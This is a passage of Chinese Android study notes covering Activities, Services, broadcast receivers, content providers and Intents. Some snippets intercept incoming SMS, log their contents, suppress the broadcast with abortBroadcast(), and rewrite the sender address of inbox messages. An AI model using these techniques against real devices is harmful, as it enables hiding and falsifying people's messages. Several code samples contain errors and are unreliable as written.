findViewById(R.id.button_new);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//启动新的Activity</span></span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>, NewActivity.class);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Action和category的值可以自定义，Android系统也提供了许多预定义的常量值，用于启动系统预定义的Activity、Service。<img src="2025-01-15-Android基础知识/image-20231021214934063.png" alt="image-20231021214934063"></p><p>Intent类中与Category相关的常量值列表<img src="2025-01-15-Android基础知识/image-20231021214955497.png" alt="image-20231021214955497"></p><p>Intent类中与Action相关的常量列表清单文件中，intent-filter之间的为主界面，.LAUNCHER为图标</p><p><img src="2025-01-15-Android基础知识/image-20231021214219019.png" alt="image-20231021214219019"></p><h4 id="Activity生命周期"><a href="#Activity生命周期" class="headerlink" title="Activity生命周期"></a>Activity生命周期</h4><p>一个Activity在其生命周期中会经历多种状态，可以使用一系列回调来处理状态之间的转换<img src="2025-01-15-Android基础知识/image-20231022162550221.png" alt="image-20231022162550221"></p><p>onCreate()：表示Activity正在被创建，做一些activity初始化工作</p><p>onStart()：Activity由不可见变为可见的时候调用。此时activity是用户可见状态，但未出现在前台。没有焦点，不能与用户交互。</p><p>onResume()：Activity准备好和用户进行交互的时候调用。此时Activity一定位于任务栈的栈顶，并且处于运行状态，可与用户进行交互。</p><p>onPause()：系统准备去启动或恢复另一个Activity的时候调用。当另外一个activity覆盖当前acitivty时，当前activity会进入到onPause()方法中，当前activity是可见的，但不能与用户交互状态。</p><p>onStop()：Activity完全不可见的时候调用。此时activity对用户是不可见的。</p><p>onDestroy()：activity被销毁之前进行调用 ，activity生命周期最后一个回调，这里可以做一些回收工作，资源释放。</p><p>onRestart()：Activity由停止状态变为运行状态的时候调用，也就是activity被重新启动了。</p><h4 id="手机中按退出时进行确定弹窗：是否确定退出"><a href="#手机中按退出时进行确定弹窗：是否确定退出" class="headerlink" title="手机中按退出时进行确定弹窗：是否确定退出"></a>手机中按退出时进行确定弹窗：是否确定退出</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> keyCode,KeyEvent event)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (keyCode == KeyEvent.KEYCODE_BACK)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(<span class="built_in">this</span>)</span><br><span class="line">            .setTitle(<span class="string">&quot;51asm&quot;</span>)</span><br><span class="line">            .setIcon(R.mipmap.ic_launcher)</span><br><span class="line">            .setMessage(<span class="string">&quot;你是否真的要退出程序？&quot;</span>)</span><br><span class="line">            .setPositiveButton(<span class="string">&quot;确定&quot;</span>，<span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListenter()&#123;</span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog,<span class="type">int</span> which)</span>&#123;</span><br><span class="line">                    finish(); <span class="comment">//销毁activity</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .setNegativeButton(<span class="string">&quot;取消&quot;</span>，<span class="literal">null</span>)</span><br><span class="line">            .create()</span><br><span class="line">            .show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.onKeyDown(keyCode,event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="动态生成Fragment"><a href="#动态生成Fragment" class="headerlink" title="动态生成Fragment"></a>动态生成Fragment<img src="2025-01-15-Android基础知识/image-20231022165305482.png" alt="image-20231022165305482"></h4><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul><li>一种可在后台执行长时间运行操作而不提供界面的应用组件</li><li>使用服务时，需要在配置文件中声明，<service android:name=".类名 "/></li></ul><h4 id="简单消息处理"><a href="#简单消息处理" class="headerlink" title="简单消息处理"></a>简单消息处理</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_start&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;start&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_stop&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;stop&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_bind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;bind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_unbind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;unbind&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_heigth</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>注册完按钮后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_start);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">button = findViewById(R.id.button_stop);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">button = findViewById(R.id.button_bind);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">button = findViewById(R.id.button_unbind);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,MyCountService.class);</span><br><span class="line">    <span class="keyword">switch</span>(v.getId())&#123;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_start: <span class="comment">//启动服务</span></span><br><span class="line">            startService(intent);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_stop:</span><br><span class="line">            stopService(intent);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_bind:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_unbind:</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BroadcastReceiver广播接收器"><a href="#BroadcastReceiver广播接收器" class="headerlink" title="BroadcastReceiver广播接收器"></a>BroadcastReceiver广播接收器</h3><p>Android系统中的Broadcast Intent</p><ul><li>网络状态变化：android.net.conn.CONNECTIVITY_CHANGE</li><li>系统启动成功：android.intent.action.BOOT_COMPLETED</li><li>电池电量变化：android.intent.action.BATTERY_CHANGED</li><li>充电：android.intent.action.ACTION_POWER_CONNECTED,android.intent.action.ACTION_POWER_DISCONNECTED</li><li>收到短信：android.provider.Telephony.SMS_RECEIVED</li></ul><h4 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_send);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//发送广播 </span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(<span class="string">&quot;www.xxx.com&quot;</span>);</span><br><span class="line">        sendBroadcast(intent);   <span class="comment">//无序广播</span></span><br><span class="line">        sendOrderedBroadcast(intent，<span class="literal">null</span>) <span class="comment">//有序广播 第二个参数是权限，对应要在配置文件中添加(静态)   </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//注册广播听众 1.动态注册 2.静态注册</span></span><br><span class="line"><span class="comment">//动态注册</span></span><br><span class="line"><span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">filter.addAction(<span class="string">&quot;www.xxx.com&quot;</span>);</span><br><span class="line">registerReceiver(<span class="keyword">new</span> <span class="title class_">MyReceiver</span>(),filter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态注册</span></span><br><span class="line">配置文件中添加(无序)</span><br><span class="line">    &lt;receiver android:name=<span class="string">&quot;.MyReceiver&quot;</span>&gt;</span><br><span class="line">        &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=<span class="string">&quot;www.xxx.com&quot;</span>/&gt;</span><br><span class="line">         &lt;/intent-filter&gt;</span><br><span class="line">    &lt;/receiver&gt;</span><br><span class="line">                </span><br><span class="line">配置文件中添加(有序)</span><br><span class="line">    &lt;receiver android:name=<span class="string">&quot;.MyReceiver&quot;</span>&gt;</span><br><span class="line">        &lt;intent-filter android:priority=<span class="string">&quot;5&quot;</span>&gt;</span><br><span class="line">        &lt;action android:name=<span class="string">&quot;www.xxx.com&quot;</span>/&gt;</span><br><span class="line">         &lt;/intent-filter&gt;</span><br><span class="line">    &lt;/receiver&gt;              </span><br><span class="line">                </span><br><span class="line"><span class="comment">//新建一个类 MyReceiver 听众</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiver</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;onReceiver&quot;</span>);    </span><br><span class="line">        abortBroadcast(); <span class="comment">//终止广播 低版本安卓一个简单漏洞 高版本安卓系统已经修复</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="短信的广播"><a href="#短信的广播" class="headerlink" title="短信的广播"></a>短信的广播</h4><p>获得短信内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//静态注册</span></span><br><span class="line">配置文件中添加(无序)</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.RECEIVE_SMS&quot;</span>/&gt;</span><br><span class="line">    &lt;receiver android:name=<span class="string">&quot;.SmsReceiver &quot;</span>&gt;</span><br><span class="line">        &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=<span class="string">&quot;android.provider.Telephony.SMS_RECEIVED/&gt;</span></span><br><span class="line"><span class="string">         &lt;/intent-filter&gt;</span></span><br><span class="line"><span class="string">    &lt;/receiver&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">//新建一个类 SmsReceiver</span></span><br><span class="line"><span class="string">public class MyReceiver extends BroadcastReceiver&#123;</span></span><br><span class="line"><span class="string">    public void onReceiver(Context context,Intent intent)&#123;</span></span><br><span class="line"><span class="string">        Log.d(&quot;</span>zxk1ng<span class="string">&quot;,&quot;</span>SmsReceiver<span class="string">&quot;);    </span></span><br><span class="line"><span class="string">        //abortBroadcast(); //终止广播 低版本安卓一个简单漏洞 高版本安卓系统已经修复</span></span><br><span class="line"><span class="string">        //短信信息 方法一</span></span><br><span class="line"><span class="string">        Bundle bundle = intent.getExtras();</span></span><br><span class="line"><span class="string">        Object[] pdus = (Object[]) bundle.get(&quot;</span>pdus<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        for(Object pdu ; pdus )&#123;</span></span><br><span class="line"><span class="string">            SmsMessage message = SmsMessage.createFromPdu((byte[])pdu);</span></span><br><span class="line"><span class="string">            String address = message.getOriginatingAddress();</span></span><br><span class="line"><span class="string">            String body = message.getMessageBody();</span></span><br><span class="line"><span class="string">            Log.d(&quot;</span>zxk1ng<span class="string">&quot;,&quot;</span>address:<span class="string">&quot;+address+&quot;</span>body:<span class="string">&quot;+body);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        //方法二：使用Telephony.Sms.Intents.getMessagesFromIntent(intent); 要求 API19</span></span><br><span class="line"><span class="string">        SmsMessage[] smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);</span></span><br><span class="line"><span class="string">        for(SmsMessage message ; smsMessages )&#123;</span></span><br><span class="line"><span class="string">            String address = message.getOriginatingAddress();</span></span><br><span class="line"><span class="string">            String body = message.getMessageBody();</span></span><br><span class="line"><span class="string">            Log.d(&quot;</span>zxk1ng<span class="string">&quot;,&quot;</span>address:<span class="string">&quot;+address+&quot;</span>body:<span class="string">&quot;+body);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>安卓8.0以上 隐式广播(配置文件中)不一定起效，但显式广播(动态)一定可以。</p><h3 id="content-provider"><a href="#content-provider" class="headerlink" title="content provider"></a>content provider</h3><h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><p>创建一个MyProvider类，重写ContentProvider类，注册内容提供者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:authorities</span>=<span class="string">&quot;包名/www.51asm.com&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:name</span>=<span class="string">&quot;.MyProvider&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>然后新建一个工程ContentReceiver作为内容接受者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">mContentResolver</span>  <span class="operator">=</span> getContentResolver();</span><br><span class="line"><span class="comment">//注册内容观察者 使用观察者要在提供者出 notifyAll()</span></span><br><span class="line">mContentResolver.registerContentObserver(Uri.parse(<span class="string">&quot;content://包名&quot;</span>),<span class="literal">true</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Button</span> <span class="variable">button_insert</span> <span class="operator">=</span> findViewById(R.id.button_insert);</span><br><span class="line">button_insert.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">        values.put(<span class="string">&quot;SID&quot;</span>,<span class="string">&quot;S004&quot;</span>);</span><br><span class="line">        values.put(<span class="string">&quot;SNAME&quot;</span>,<span class="string">&quot;日光&quot;</span>)       </span><br><span class="line">        mContentResolver.insert(Uri.parse(<span class="string">&quot;content://包名&quot;</span>),values);              </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="短信"><a href="#短信" class="headerlink" title="短信"></a>短信</h4><p>在配置文件中设置用户权限<br><img src="2025-01-15-Android基础知识/image-20231027144507100.png" alt="image-20231027144507100"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ManActivity中： </span></span><br><span class="line">requestPermissions(<span class="keyword">new</span> <span class="title class_">String</span>[]  &#123;Manifest.permission.SEND_SMS,</span><br><span class="line">                                 Manifest.permission.READ_SMS&#125;,<span class="number">1000</span>)；</span><br><span class="line"><span class="comment">//SmsManager smsManager = SmsManager getDefault();</span></span><br><span class="line"><span class="comment">//smsManager.sendTextMessage(&quot;5556&quot;,null,&quot;msg&quot;,null,null);</span></span><br><span class="line"><span class="type">ContentResolver</span> <span class="variable">cr</span>  <span class="operator">=</span> getContentResolver();</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改短信</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Contentvalues</span>();</span><br><span class="line">values.put(Telephony.Sms.Inbox.ADDRESS,<span class="string">&quot;100&quot;</span>);<span class="comment">//电话修改为110</span></span><br><span class="line">cr.update(Telephony.Sms.Inbox.CONTENT_URI,values,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取短信</span></span><br><span class="line"><span class="type">Cursor</span> <span class="variable">curson</span> <span class="operator">=</span> cr.query(Telephony.Sms.Inbox.CONTENT_URI,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span>(cursor !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(cursor.moveToFirst())&#123;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexID</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox._ID);</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexAddress</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox.ADDRESS);</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexDate</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox.DATE);</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexBody</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox.BODY);</span><br><span class="line">            <span class="type">String</span> <span class="variable">_ID</span> <span class="operator">=</span> cursor.getString(indexID);</span><br><span class="line">            <span class="type">String</span> <span class="variable">ADDRESS</span> <span class="operator">=</span> cursor.getString(indexAddress);</span><br><span class="line">            <span class="type">Long</span> <span class="variable">DATE</span> <span class="operator">=</span> cursor.getLong(indexDate);</span><br><span class="line">            <span class="type">String</span> <span class="variable">BODY</span> <span class="operator">=</span> cursor.getString(indexBody);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//转化时间格式 </span></span><br><span class="line">            <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM--dd hh:mm:ss&quot;</span>);</span><br><span class="line">            simpleDateFormat.format(<span class="keyword">new</span> <span class="title class_">Date</span>(DATE));</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;_ID:&quot;</span>+_ID+<span class="string">&quot; DATE:&quot;</span>+DATE+<span class="string">&quot; ADDRESS:&quot;</span>+ADDRESS+<span class="string">&quot; BODY:&quot;</span>+BODY);           </span><br><span class="line">        &#125;<span class="keyword">while</span>(cursor.moveToNext());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    Intent</p><h3 id="Intent：拨打电话"><a href="#Intent：拨打电话" class="headerlink" title="Intent：拨打电话"></a>Intent：拨打电话</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(Intent.Action_CALL);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;tel:120&quot;</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//manifests中设置用户权限 &lt;uses-permission android:name=&quot;android.intent.action.CALL_PHONE&quot;/&gt;</span></span><br><span class="line"><span class="comment">//在Android 11 中权限设置中手动给自定义app拨打电话的权限</span></span><br></pre></td></tr></table></figure><h3 id="Intent：打开浏览器"><a href="#Intent：打开浏览器" class="headerlink" title="Intent：打开浏览器"></a>Intent：打开浏览器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(Intent.Action_VIEW );</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;网址内容&quot;</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Intent：设闹钟"><a href="#Intent：设闹钟" class="headerlink" title="Intent：设闹钟"></a>Intent：设闹钟</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(AlarmClock.ACTION_SET_ALARM)</span><br><span class="line">            .putExtra(AlarmClock.EXTRA_MESSAGE, message)</span><br><span class="line">.putExtra(AlarmClock.EXTRA_HOUR, hour)</span><br><span class="line">.putExtra(AlarmClock.EXTRA_MINUTES, minute);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="显式Intent"><a href="#显式Intent" class="headerlink" title="显式Intent"></a>显式Intent</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取intent数据 在loginactivity中写：</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="type">String</span> <span class="variable">accout</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;key_account&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;key_password&quot;</span>);</span><br><span class="line">usernameEditText.setText(accout);</span><br><span 